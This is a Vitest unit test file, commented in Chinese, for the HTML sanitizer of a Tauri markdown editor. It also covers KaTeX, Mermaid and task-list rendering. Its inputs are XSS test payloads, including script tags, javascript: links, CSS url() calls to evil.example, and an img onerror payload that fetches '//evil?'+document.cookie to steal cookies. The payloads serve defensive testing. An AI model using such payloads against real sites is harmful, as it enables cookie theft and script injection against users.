/**
 * sanitizeHtml / safeRender 单元测试（对应 C-01 Critical 与 M-04 Major）
 *
 * 验证所有注入 DOM 的 HTML 都经过白名单清洗：
 *  - 脚本 / 事件处理器 / 危险标签被剥离
 *  - javascript: 协议被中和
 *  - 外链自动加 target=_blank rel=noopener（防 opener 劫持）
 *  - 非任务列表 <input> 降级为禁用复选框
 *  - Tauri asset:// 资源协议被保留（本地图片预览依赖）
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml, safeRender, type RenderLike } from "../sanitize";
import { createMd, needsMath, renderMathPlaceholder } from "../md-pipeline";

// 一个最小「渲染器」：把输入原样当 HTML 返回，便于隔离测试清洗层本身
const echo: RenderLike = { render: (s) => s };

describe("C-01 脚本与危险标签拦截", () => {
  it("剥离 <script>", () => {
    const out = sanitizeHtml("<p>hi</p><script>alert(1)</script>");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert(1)");
  });

  it("剥离 <iframe>", () => {
    const out = sanitizeHtml('<iframe src="javascript:alert(1)"></iframe>');
    expect(out).not.toContain("<iframe");
  });

  it("剥离 <style>（防止 CSS 外链泄漏）", () => {
    const out = sanitizeHtml("<style>body{background:url(http://evil/x)}</style><p>ok</p>");
    expect(out).not.toContain("<style");
  });

  it("剥离 <form>/<button> 等诱导交互面", () => {
    const out = sanitizeHtml('<form action="//evil"><button>x</button></form>');
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<button");
  });

  it("剥离 <object>/<embed>/<link>/<base>/<meta>", () => {
    for (const tag of [
      '<object data="x"></object>',
      '<embed src="x">',
      '<link rel="stylesheet" href="//evil">',
      "<base href=\"//evil\">",
      '<meta http-equiv="refresh" content="0;url=//evil">',
    ]) {
      const out = sanitizeHtml(tag);
      expect(out.toLowerCase()).not.toContain(tag.split(" ")[0].slice(0, 6));
    }
  });
});

describe("C-01 事件处理器与危险协议中和", () => {
  it("剥离 <img onerror>", () => {
    const out = sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
  });

  it("中和 javascript: 链接", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain("javascript:alert");
  });

  it("保留合法 https 链接", () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toContain('href="https://example.com"');
  });
});

describe("C-01 外链加安全属性（防 window.opener 劫持）", () => {
  it("外链自动加 target=_blank rel=noopener noreferrer", () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer"');
  });

  it("内链（相对路径）不加 target", () => {
    const out = sanitizeHtml('<a href="local.md">local</a>');
    expect(out).not.toContain('target="_blank"');
    expect(out).toContain('href="local.md"');
  });
});

describe("C-01/M-04 任务列表 input 降级", () => {
  it("非任务列表 <input type=text> 降级为禁用复选框", () => {
    const out = sanitizeHtml('<input type="text" name="x">');
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).not.toContain('type="text"');
  });

  it("任务列表复选框（checked）保留为禁用 checkbox", () => {
    const out = sanitizeHtml('<input type="checkbox" checked>');
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).toContain("checked");
  });
});

describe("C-01 Tauri 资源协议放行（本地图片预览依赖）", () => {
  it("asset://localhost 图片地址被保留", () => {
    const out = sanitizeHtml('<img src="asset://localhost/foo.png" alt="x">');
    expect(out).toContain("asset://localhost/foo.png");
  });

  it("tauri:// 协议被保留", () => {
    const out = sanitizeHtml('<img src="tauri://asset/foo.png">');
    expect(out).toContain("tauri://asset/foo.png");
  });
});

describe("safeRender 组合渲染+清洗", () => {
  it("渲染输出中的脚本被清洗", () => {
    const out = safeRender(echo, "<div><script>steal()</script>ok</div>");
    expect(out).not.toContain("<script");
    expect(out).toContain("ok");
  });

  it("空输入返回空字符串（不抛错）", () => {
    expect(sanitizeHtml("")).toBe("");
  });
});

describe("M-04 原始 HTML 无法持久化为可执行脚本", () => {
  it("contenteditable 可能粘入的内联样式标签被剥离，XSS 向量消除", () => {
    // 模拟预览编辑模式粘入 `<img onerror>` 再落盘；再次渲染时不应执行
    const injected = '<p>a</p><img src=x onerror="fetch(\'//evil?\'+document.cookie)">';
    const out = sanitizeHtml(injected);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("fetch");
  });
});

describe("内联样式白名单（布局劫持 / CSS 外链防护）", () => {
  it("保留正常排版样式（颜色、字号、对齐）", () => {
    const out = sanitizeHtml('<span style="color: red; font-size: 14px; text-align: center">x</span>');
    expect(out).toContain("color: red");
    expect(out).toContain("font-size: 14px");
    expect(out).toContain("text-align: center");
  });

  it("剥离 position/z-index/transform 等布局覆盖属性", () => {
    const out = sanitizeHtml(
      '<div style="position: fixed; z-index: 9999; transform: scale(2); color: blue">x</div>'
    );
    expect(out).not.toContain("position");
    expect(out).not.toContain("z-index");
    expect(out).not.toContain("transform");
    expect(out).toContain("color: blue");
  });

  it("剥离含 url() 的 background（外链探测），保留同元素的安全属性", () => {
    const out = sanitizeHtml(
      '<span style="background: url(https://evil.example/x.png); color: blue">x</span>'
    );
    expect(out).not.toContain("url(");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("color: blue");
  });

  it("阻断 CSS 转义形式的 url()（u\\72l(...)）", () => {
    const out = sanitizeHtml(
      '<span style="background: u\\72l(https://evil.example/x.png); color: blue">x</span>'
    );
    expect(out).not.toContain("background");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("color: blue");
  });

  it("剥离 expression()/javascript: 等脚本化样式值", () => {
    const out = sanitizeHtml(
      '<span style="width: expression(alert(1)); background-color: javascript:alert(1)">x</span>'
    );
    expect(out).not.toContain("expression");
    expect(out).not.toContain("javascript:");
  });

  it("仅含危险属性时移除整条 style 属性", () => {
    const out = sanitizeHtml('<span style="position: fixed; z-index: 9999">x</span>');
    expect(out).not.toContain("style=");
  });
});

// ---------------------------------------------------------------------------
// E5 渲染补强追加用例（C-4 任务列表 / C-5 KaTeX / C-6 Mermaid 占位）
// 现有用例一条未改；以下只验证「新增放行面」与「原有拦截面不回归」。
// ---------------------------------------------------------------------------

describe("E5 C-4 任务列表复选框经 sanitize 存活", () => {
  it("markdown-it-task-lists 产物（input disabled + li.task-list-item）保留", () => {
    const out = sanitizeHtml(
      '<ul class="contains-task-list"><li class="task-list-item">' +
        '<input class="task-list-item-checkbox" disabled="" type="checkbox">done</li></ul>'
    );
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    // li 上的 task-list-item 类是 CSS 挂钩，必须存活
    expect(out).toContain("task-list-item");
  });

  it("勾选态复选框 checked 保留且仍带 disabled", () => {
    const out = sanitizeHtml('<input class="task-list-item-checkbox" checked="" disabled="" type="checkbox">');
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).toContain("checked");
  });
});

describe("E5 C-5 KaTeX 产物经 sanitize 存活", () => {
  it(".katex span 的 class / aria-hidden 保留", () => {
    const out = sanitizeHtml(
      '<span class="katex"><span class="katex-html" aria-hidden="true"><span class="base">x</span></span></span>'
    );
    expect(out).toContain('class="katex"');
    expect(out).toContain("aria-hidden");
    expect(out).toContain("katex-html");
  });

  it(".katex 子树内的堆叠样式（position:relative / top）保留", () => {
    const out = sanitizeHtml(
      '<span class="katex"><span class="vlist-t vlist-t2" style="position:relative;top:-2.355em;">' +
        '<span class="x">y</span></span></span>'
    );
    expect(out).toContain("position: relative");
    expect(out).toContain("-2.355em");
  });

  it(".katex 子树内 border-bottom-width / padding-left / height 等几何属性保留", () => {
    const out = sanitizeHtml(
      '<span class="katex"><span class="sqrt-sign" style="border-bottom-width:0.08em;height:1.04em;padding-left:0.83em;min-width:1.02em;">x</span></span>'
    );
    expect(out).toContain("border-bottom-width: 0.08em");
    expect(out).toContain("padding-left: 0.83em");
    expect(out).toContain("height: 1.04em");
  });

  it("回归：.katex 之外的 position:fixed 仍被剥离（点击劫持面不放开）", () => {
    const out = sanitizeHtml('<div style="position: fixed; top: 0; color: blue">x</div>');
    expect(out).not.toContain("position");
    expect(out).toContain("color: blue");
  });

  it("回归：手写 class=katex 也拿不到 position:fixed（值级收紧）", () => {
    const out = sanitizeHtml('<span class="katex" style="position:fixed;top:0">x</span>');
    expect(out).not.toContain("fixed");
    expect(out).toContain("katex");
  });
});

describe("E5 C-6 Mermaid 占位 data-src 放行", () => {
  it("mermaid-placeholder 的 data-src（encodeURIComponent 编码原文）经 sanitize 存活", () => {
    const src = "graph TD;\n  A-->B;";
    const out = sanitizeHtml(
      `<div class="mermaid-placeholder" data-src="${encodeURIComponent(src)}">${src.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`
    );
    expect(out).toContain("mermaid-placeholder");
    expect(out).toContain("data-src");
    const m = out.match(/data-src="([^"]*)"/);
    expect(m).not.toBeNull();
    expect(decodeURIComponent(m![1])).toBe(src); // 解码即原文
    expect(out).toContain("A--"); // 原文文本通道（> 序列化为 &gt;）
  });

  it("回归：ALLOW_DATA_ATTR=false 未放开——其他 data-* 仍被剥离", () => {
    const out = sanitizeHtml('<div data-evil="x" data-src="ok">y</div>');
    expect(out).not.toContain("data-evil");
    expect(out).toContain("data-src");
  });
});

describe("E5 管线集成（createMd + safeRender 端到端）", () => {
  it("任务列表：渲染出 disabled 复选框，li 带 task-list-item，经 sanitize 存活", async () => {
    const md = await createMd();
    const out = safeRender(md, "- [x] done\n- [ ] todo\n");
    expect(out).toContain('type="checkbox"');
    expect(out).toContain("disabled");
    expect(out).toContain("task-list-item");
    expect(out).toContain("checked"); // [x] 勾选态
  });

  it("块级数学：$$...$$ 经 katex 渲染并经 sanitize 存活", async () => {
    const md = await createMd();
    // 分式/根式会触发 KaTeX 的 vlist 行内堆叠（top/height/border-bottom-width）
    const out = safeRender(md, "$$\n\\frac{-b \\pm \\sqrt{b^2-4ac}}{2a}\n$$\n");
    expect(out).toContain("katex");
    expect(out).toContain("math-block");
    expect(out).toContain("top: -2.314em"); // 堆叠位移必须活着，否则分式散架
    expect(out).toContain("border-bottom-width");
  });

  it("行内数学：$...$ 经 katex 渲染并经 sanitize 存活", async () => {
    const md = await createMd();
    const out = safeRender(md, "令 $x^2+y^2=z^2$ 成立。\n");
    expect(out).toContain("katex");
    expect(out).not.toContain("math-pending"); // katex 已装，不应走占位
  });

  it("货币文本不触发数学渲染（$5 and $10 保持字面）", async () => {
    const md = await createMd();
    const out = safeRender(md, "price is $5 and $10 total\n");
    expect(out).not.toContain("katex");
    expect(out).toContain("$5");
  });

  it("mermaid 围栏：输出占位 div，data-src 含编码原文，不渲染图表", async () => {
    const md = await createMd();
    const out = safeRender(md, "```mermaid\ngraph TD;\n  A-->B;\n```\n");
    expect(out).toContain("mermaid-placeholder");
    expect(out).toContain("data-src");
    const m = out.match(/data-src="([^"]*)"/);
    expect(m).not.toBeNull();
    // markdown-it 围栏内容自带尾部换行；data-src 编码后应可解码还原
    expect(decodeURIComponent(m![1])).toBe("graph TD;\n  A-->B;\n");
    expect(out).not.toContain("<svg"); // 未引 mermaid 库
  });

  it("数学规则不破坏普通围栏代码块（```js 仍走高亮/默认路径）", async () => {
    const md = await createMd();
    const out = safeRender(md, "```js\nconst a = 1;\n```\n");
    expect(out).toContain("<pre");
    expect(out).toContain("const a = 1;");
    expect(out).not.toContain("mermaid-placeholder");
  });

  it("createMd({ math: false }) 跳过 katex 装载，数学退化为 math-pending 占位", async () => {
    const md = await createMd({ math: false });
    const out = safeRender(md, "行内 $x^2$ 与块级：\n\n$$\n\\frac{a}{b}\n$$\n");
    expect(out).not.toContain('class="katex"');
    expect(out).toContain("math-pending");
    // 占位内容仍是公式原文（转义后），用户可见
    expect(out).toContain("x^2");
    expect(out).toContain("\\frac{a}{b}");
  });

  it("needsMath：识别数学、排除货币与纯文本", () => {
    expect(needsMath("令 $x^2$ 成立")).toBe(true);
    expect(needsMath("$$\nE=mc^2\n$$")).toBe(true);
    expect(needsMath("$$a+b$$ 同行闭合")).toBe(true); // 行首 $$
    expect(needsMath("price $5 and $10")).toBe(false);
    expect(needsMath("plain text")).toBe(false);
    expect(needsMath("")).toBe(false);
    expect(needsMath("转义 \\$x\\$ 不算")).toBe(false);
    expect(needsMath("行中出现 $$a+b$$ 但不在行首（块级规则不接管）")).toBe(false);
  });

  it("renderMathPlaceholder：占位形态与 HTML 转义", () => {
    const inline = renderMathPlaceholder("<b>&</b>", false);
    expect(inline).toContain('class="math-pending"');
    expect(inline).not.toContain("<b>"); // 已转义
    expect(inline).toContain("&lt;b&gt;");
    const block = renderMathPlaceholder("x", true);
    expect(block).toContain("math-pending-block");
  });

  it("管线产物中的 XSS 向量仍被全拦（C-01 不回归）", async () => {
    const md = await createMd();
    // markdown-it 自身拒绝 javascript: 链接（渲染为字面文本），sanitize 再兜底
    const out = safeRender(
      md,
      '<script>alert(1)</script>\n\n<img src=x onerror="alert(2)">\n\n<a href="javascript:alert(3)">bad</a>\n'
    );
    expect(out).not.toContain("<script");
    expect(out).not.toContain("onerror");
    expect(out).not.toContain('href="javascript:'); // 字面文本可出现，可执行链接不行
    expect(out).toContain("bad"); // 链接文本保留
  });
});
